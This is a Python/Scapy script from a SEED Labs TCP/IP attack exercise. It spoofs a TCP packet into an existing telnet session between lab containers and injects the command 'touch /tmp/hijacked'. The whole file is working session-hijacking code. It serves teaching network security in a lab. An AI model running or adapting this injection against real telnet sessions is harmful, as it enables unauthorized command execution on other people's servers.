#!/usr/bin/env python3
"""
Task 3: TCP Session Hijacking (Manual)
SEED Labs - TCP/IP Attack Lab

This script sends a spoofed TCP packet carrying malicious data into an
existing telnet session.  All values must be obtained from Wireshark
before running the script.

INSTRUCTIONS:
1. Start Wireshark and capture on br-983f4e838608
2. Establish a telnet session from user1 (10.9.0.6) to victim (10.9.0.5)
3. Type something in the telnet session to generate traffic
4. Observe a packet from client to server and note:
   - SRC_IP: Source IP address (client)
   - DST_IP: Destination IP address (server)
   - SPORT: Source port (client port)
   - DPORT: Destination port (23 for telnet)
   - SEQ: Sequence number from the packet
   - ACK: Acknowledgement number from the packet
5. Fill in the values below
6. Optionally modify the DATA (malicious command) to inject
7. Run: sudo python3 session_hijack.py

Usage:
    sudo python3 session_hijack.py
"""

from scapy.all import *

# ------------------------------------------------------------------
# Fill in these values from Wireshark before running the script.
# ------------------------------------------------------------------
SRC_IP  = "10.9.0.6"   # telnet client IP (packet appears to come from client)
DST_IP  = "10.9.0.5"   # telnet server IP
SPORT   = 12345         # client-side source port (from Wireshark)
DPORT   = 23            # telnet destination port
SEQ     = 0             # sequence number (from Wireshark)
ACK     = 0             # acknowledgement number (from Wireshark)
DATA    = "\r touch /tmp/hijacked \r"  # malicious command to inject
# ------------------------------------------------------------------

ip  = IP(src=SRC_IP, dst=DST_IP)
tcp = TCP(sport=SPORT, dport=DPORT, flags="A", seq=SEQ, ack=ACK)
pkt = ip / tcp / DATA

print("[*] Sending hijacking packet...")
print(f"    Source: {SRC_IP}:{SPORT}")
print(f"    Destination: {DST_IP}:{DPORT}")
print(f"    Sequence: {SEQ}")
print(f"    ACK: {ACK}")
print(f"    Payload: {DATA.strip()}")
ls(pkt)
send(pkt, verbose=0)
print("[+] Malicious packet sent – check the server for the injected command.")
